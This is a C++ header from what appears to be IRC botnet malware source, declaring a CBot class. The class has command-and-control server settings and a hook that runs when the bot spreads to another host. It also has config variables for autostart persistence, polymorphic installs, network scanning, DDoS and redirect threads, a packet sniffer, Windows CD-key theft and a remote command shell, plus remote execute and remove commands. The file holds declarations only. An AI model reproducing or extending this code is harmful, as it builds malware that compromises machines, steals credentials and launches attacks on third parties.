

#ifndef __BOT_H__
#define __BOT_H__

#include "cvar.h"
#include "commands.h"
#include "message.h"
#include "irc.h"
#define SCRIPT_ONSPREAD		7	// Runs when the bot spreads to another host

class CBot : public CCommandHandler
{
public:
	CBot();
	void Init();
	void Config();
	void Autostart();
	void Recv(CMessage *pMsg, bool bInternal=false);
	bool HandleMsg(CMessage *pMsg);
	bool HandleMsgInt(CMessage *pMsg);
	bool HandleFallBack(CMessage *pMsg);
	bool Think();

	CString SysInfo();
	CString LongUptime(int iDays);
	int UptimeDays();
	CString Status();

	bool m_bJoined;
	unsigned long m_lStartTime;

	cvar	si_nickprefix, si_servpass, si_server, si_port, si_chanpass, si_mainchan, si_nick, si_usessl,
			bot_version, bot_filename, bot_id, bot_prefix, bot_ftrans_port, bot_ftrans_port_ftp, bot_timeout,
			bot_seclogin, bot_compnick, bot_randnick, bot_meltserver, bot_topiccmd,
			as_valname, as_enabled, as_service, as_service_name,
			inst_polymorph,
			scan_maxthreads, scan_maxsockets,
			ddos_maxthreads,
			redir_maxthreads,
			identd_enabled, cdkey_windows,
			sniffer_enabled, sniffer_channel,
			csendfile_show, bot_cmdshell;

	bool HandleCommand(CMessage *pMsg);

	command	m_cmdRemove, m_cmdStatus, m_cmdRndNick, m_cmdDie, m_cmdId, m_cmdAbout,
			m_cmdSysInfo, m_cmdLongUptime, m_cmdNick, m_cmdOpen, m_cmdDns, m_cmdRemoveAllBut,
			m_cmdExecute, m_cmdQuit, m_cmdFlushDNS, m_cmdSecure, m_cmdUnSecure, m_cmdCommand;
	
	irc_server  m_isServerRoot, m_isServer0, m_isServer1, m_isServer2, m_isServer3, m_isServer4,
				m_isServer5, m_isServer6, m_isServer7;
};

#endif // __BOT_H__
